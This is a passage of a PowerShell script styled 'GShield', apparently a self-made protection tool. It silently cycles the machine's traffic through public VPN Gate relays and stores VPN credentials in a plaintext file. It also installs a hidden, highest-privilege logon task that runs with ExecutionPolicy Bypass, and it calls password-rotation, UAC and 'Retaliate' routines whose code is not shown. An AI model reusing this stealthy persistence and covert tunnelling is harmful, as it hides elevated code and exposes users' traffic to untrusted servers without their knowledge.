                $png = New-Object System.Net.NetworkInformation.Ping
                $pr = $png.Send('1.1.1.1', 4500)
                return ($pr.Status -eq 'Success')
            } catch { return $false }
        }
        function Test-VgTunnelUp {
            $vpn = Get-VpnConnection -Name $VG_ConnName -EA SilentlyContinue
            if ($vpn -and $vpn.ConnectionStatus -eq 'Connected') { return $true }
            if (Get-Process -Name 'openvpn' -EA SilentlyContinue) { return $true }
            return $false
        }
        function Connect-VgL2tp {
            param($S)
            $ras = Join-Path $env:SystemRoot 'System32\rasdial.exe'
            $n = $VG_ConnName
            foreach ($enc in @('Required', 'Optional', 'Maximum')) {
                try {
                    Remove-VpnConnection -Name $n -Force -EA SilentlyContinue
                    Add-VpnConnection -Name $n -ServerAddress $S.IP -TunnelType L2tp -L2tpPsk $VG_Psk `
                        -AuthenticationMethod MSChapv2 -EncryptionLevel $enc -Force -RememberCredential $false -EA Stop
                    $p = Start-Process -FilePath $ras -ArgumentList @($n, $VG_User, $VG_Pass) -Wait -PassThru -WindowStyle Hidden -NoNewWindow
                    if ($p.ExitCode -eq 0) {
                        Start-Sleep -Seconds 6
                        if (Test-VgPingOk) { Write-VgLog "L2TP OK ($enc) $($S.IP)"; return $true }
                    }
                } catch {
                    Write-VgLog "L2TP $enc failed: $($_.Exception.Message)" 'WARN'
                }
                Start-Process -FilePath $ras -ArgumentList @($n, '/disconnect') -Wait -WindowStyle Hidden -NoNewWindow -EA 0 | Out-Null
                Remove-VpnConnection -Name $n -Force -EA SilentlyContinue
            }
            return $false
        }
        function Connect-VgOpenVpn {
            param($S)
            $exe = Get-VgOpenVpnExe
            if (-not $exe) { return $false }
            try {
                $bytes = [Convert]::FromBase64String($S.OvpnB64)
                $txt = [Text.Encoding]::UTF8.GetString($bytes)
            } catch {
                Write-VgLog "OpenVPN base64 decode failed" 'WARN'
                return $false
            }
            if (-not (Test-Path $VG_WorkDir)) { New-Item -Path $VG_WorkDir -ItemType Directory -Force | Out-Null }
            $cfg = Join-Path $VG_WorkDir 'gshield.ovpn'
            $auth = Join-Path $VG_WorkDir 'auth.txt'
            [IO.File]::WriteAllText($cfg, ($txt -replace "`r`n", "`n"), [Text.UTF8Encoding]::new($false))
            [IO.File]::WriteAllText($auth, "$VG_User`n$VG_Pass`n", [Text.UTF8Encoding]::new($false))
            Stop-VgOpenVpn
            $arg = @('--config', $cfg, '--auth-user-pass', $auth, '--verb', '0', '--connect-retry-max', '3', '--connect-timeout', '25')
            $proc = Start-Process -FilePath $exe -ArgumentList $arg -PassThru -WindowStyle Hidden -NoNewWindow
            Start-Sleep -Seconds 14
            if (-not $proc -or $proc.HasExited) { return $false }
            if (-not (Get-Process -Id $proc.Id -EA SilentlyContinue)) { return $false }
            if (Test-VgPingOk) {
                Write-VgLog "OpenVPN OK $($S.IP)"
                return $true
            }
            Stop-VgOpenVpn
            return $false
        }
        function Try-Connect-VgServer {
            param($S)
            Disconnect-Vg
            if (Connect-VgL2tp $S) { return $true }
            Disconnect-Vg
            if (Connect-VgOpenVpn $S) { return $true }
            Disconnect-Vg
            return $false
        }

        Write-VgLog 'VPN Gate auto-client (L2TP then OpenVPN fallback, silent)'
        $myCc = Get-VgCountry
        $geoHint = if ($myCc) { $myCc } else { 'unknown' }
        Write-VgLog ('Geo hint: ' + $geoHint)
        $ov = Get-VgOpenVpnExe
        $ovMsg = if ($ov) { $ov } else { 'not installed - L2TP only' }
        Write-VgLog ('OpenVPN binary: ' + $ovMsg)
        $queue = @()
        $lastRefresh = [datetime]::MinValue
        $idx = 0
        $badHealth = 0
        while ($true) {
            try {
                if ($queue.Count -eq 0 -or ((Get-Date) - $lastRefresh).TotalMinutes -ge $VG_RefreshMin) {
                    $queue = Get-VgServers $myCc
                    $lastRefresh = Get-Date
                    $idx = 0
                    Write-VgLog "Ranked $($queue.Count) relays"
                    if ($queue.Count -eq 0) {
                        Start-Sleep -Seconds 120
                        continue
                    }
                }
                if (-not (Test-VgTunnelUp)) {
                    $srv = $queue[$idx % $queue.Count]
                    Write-VgLog "[#$idx] $($srv.HostName) $($srv.IP) $($srv.CountryShort)"
                    $ok = Try-Connect-VgServer $srv
                    if (-not $ok) {
                        Write-VgLog "All methods failed $($srv.IP) - next" 'WARN'
                        $idx++
                        Start-Sleep -Seconds 8
                        continue
                    }
                    $badHealth = 0
                    Start-Sleep -Seconds 8
                    continue
                }
                if (-not (Test-VgPingOk)) {
                    $badHealth++
                    if ($badHealth -ge 2) {
                        Write-VgLog 'Health fail - rotate' 'WARN'
                        Disconnect-Vg
                        $idx++
                        $badHealth = 0
                    }
                } else {
                    $badHealth = 0
                }
            } catch {
                Write-VgLog "Loop: $_" 'WARN'
                try { Disconnect-Vg } catch {}
                $idx++
            }
            Start-Sleep -Seconds $VG_CheckSec
        }
    })
    $ps.BeginInvoke() | Out-Null
    Write-Log 'VPN Gate auto-connect started (file log only; use -NoVpnGate to disable)' 'INFO' -FileOnly
}

# ==================== PERSISTENCE ====================
function Install-Persistence {
    $taskName  = "GShield"
    $scriptPath = $PSCommandPath
    schtasks.exe /Delete /TN "MicrosoftSysCache" /F 2>$null
    schtasks.exe /Delete /TN $taskName /F 2>$null
    $cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    schtasks.exe /Create /TN $taskName /TR $cmd /SC ONLOGON /RL HIGHEST /F 2>$null | Out-Null
    Write-Log "Persistence installed as $taskName"
}

# ==================== MAIN ====================
try {
    if (!(Test-Path $LogDir))  { New-Item $LogDir  -ItemType Directory -Force | Out-Null }
    if (!(Test-Path $QuarDir)) { New-Item $QuarDir -ItemType Directory -Force | Out-Null }

    Write-Log "GShield v3.0 starting - PID: $PID"
    Install-Persistence
    Install-PasswordRotator
    Invoke-UACPolicyEnforce
    Start-ContinuousModuleMonitor
    Start-KeyScrambler
    if (-not $NoVpnGate) { Start-VpnGateSmartClient }

    if ($IntervalMinutes -le 0) {
        Invoke-RetaliateMonitorCycle
        exit
    }

    $vg = if (-not $NoVpnGate) { ' | VPN Gate (auto)' } else { '' }
    Write-Log ("Retaliate | PasswordRotator | KeyScrambler | Module monitor | UAC" + $vg + " - active (cycle every $IntervalMinutes min)")
    while ($true) {
        Invoke-UACPolicyEnforce
        Invoke-RetaliateMonitorCycle
        Start-Sleep -Seconds ($IntervalMinutes * 60)
    }
} catch {
    Write-Log "FATAL ERROR: $_" "ERROR"
}

